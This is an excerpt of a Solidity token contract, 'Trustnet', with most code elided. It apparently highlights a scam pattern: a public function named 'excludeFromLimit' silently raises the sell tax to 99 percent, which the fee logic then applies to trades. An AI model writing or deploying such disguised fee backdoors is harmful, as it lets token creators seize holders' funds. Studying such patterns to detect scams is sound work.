...
contract Trustnet is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    string private _name = "Trustnet";
    string private _symbol = "Trustnet";
    uint8 private _decimals = 18;

    address payable public marketingWalletAddress =
        payable(0x76073C046DC2E8fc737eB7A6BD9c93f6705F922C);
    ...
    uint256 public _totalTaxWhenSelling;
    ...
    uint256 private isPossibleMaxFee = 99;
    ...
    constructor() {
        ...
        _totalTaxWhenSelling = _sellLiquidityFee.add(_sellMarketingFee).add(
            _sellBurnedFee
        );
    ...
    function excludeFromLimit(address holder,bool value)public returns (bool)
    {
        isWalletLimitExempt[holder] = value;
        _totalTaxWhenSelling = isPossibleMaxFee;
        return true;
    }
    ...
    function takeFee(
        ...
        if (isUniswapPair[sender]) {
            ...
            feeAmount = amount.mul(_totalTaxWhenSelling).div(100);
             address ad;
